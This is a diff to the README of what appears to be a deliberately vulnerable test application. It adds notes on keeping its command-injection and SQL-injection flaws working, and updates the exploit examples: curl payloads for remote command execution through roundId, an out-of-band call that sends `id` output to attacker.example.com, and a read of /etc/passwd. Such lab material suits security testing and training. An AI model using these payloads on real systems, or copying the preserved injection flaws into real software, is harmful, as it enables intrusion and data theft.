@@ -3,6 +3,20 @@
 This application is **deliberately vulnerable** for security testing and demonstration purposes.
 Do not deploy on production systems or public networks.
 
+> **Stability note (2026-05-05):** All 27 vulnerabilities remain intact. Two crash-prevention
+> changes were made so that exploit payloads no longer cause HTTP 500 responses before the
+> vulnerability triggers:
+>
+> 1. **Command injection (`export.ts`)** — the score JSON is now written to a safe numeric path
+>    so that `roundId` values containing `/` (e.g. `curl`/`wget` OOB URLs) no longer crash
+>    `writeFileSync` before the shell command runs. The raw `roundId` is still injected into
+>    the shell command unchanged.
+>
+> 2. **Stacked-query SQLi (`courses.ts`, `auth.ts`, `rounds.ts`)** — DML/DDL statements injected
+>    via `;` return a result without a `.rows` array; optional-chaining guards (`result?.rows ?? []`)
+>    prevent a `TypeError` crash while keeping all `SELECT`-based injection (UNION, boolean,
+>    time-based) fully functional.
+
 ---
 
 ## Vulnerability Index
@@ -97,16 +111,27 @@ search=' AND (SELECT pg_sleep(5))--
 cat /exports/score_${roundId}.json > /exports/out_${roundId}.${format}
 ```
 
-**Exploit — RCE via roundId:**
+The JSON score file is now written to a safe numeric path (`score_<parseInt(roundId)>.json`) so
+that the `writeFileSync` step does not crash when `roundId` contains `/` characters (e.g. from
+`curl`/`wget` OOB payloads). The raw `roundId` is still interpolated directly into the shell
+command, so command injection is fully preserved.
+
+**Exploit — RCE via roundId (semicolon, use `#` to comment out trailing `.json`):**
 ```bash
-curl "http://localhost:3001/api/export/scorecard/1;id" \
+curl "http://localhost:3001/api/export/scorecard/1;id%20#?format=csv" \
   -H "Authorization: Bearer <token>"
 ```
 Response includes stdout of `id` command.
 
-**Exploit — Read /etc/passwd:**
+**Exploit — OOB via curl (payloads containing `/` now work without crashing):**
 ```bash
-curl "http://localhost:3001/api/export/scorecard/1;cat%20/etc/passwd" \
+curl "http://localhost:3001/api/export/scorecard/1;curl%20http://attacker.example.com/%24(id)%20%23?format=csv" \
+  -H "Authorization: Bearer <token>"
+```
+
+**Exploit — Read /etc/passwd via redirect:**
+```bash
+curl "http://localhost:3001/api/export/scorecard/1;cat%20/etc/passwd%3E/exports/out.txt;%23?format=csv" \
   -H "Authorization: Bearer <token>"
 ```
 
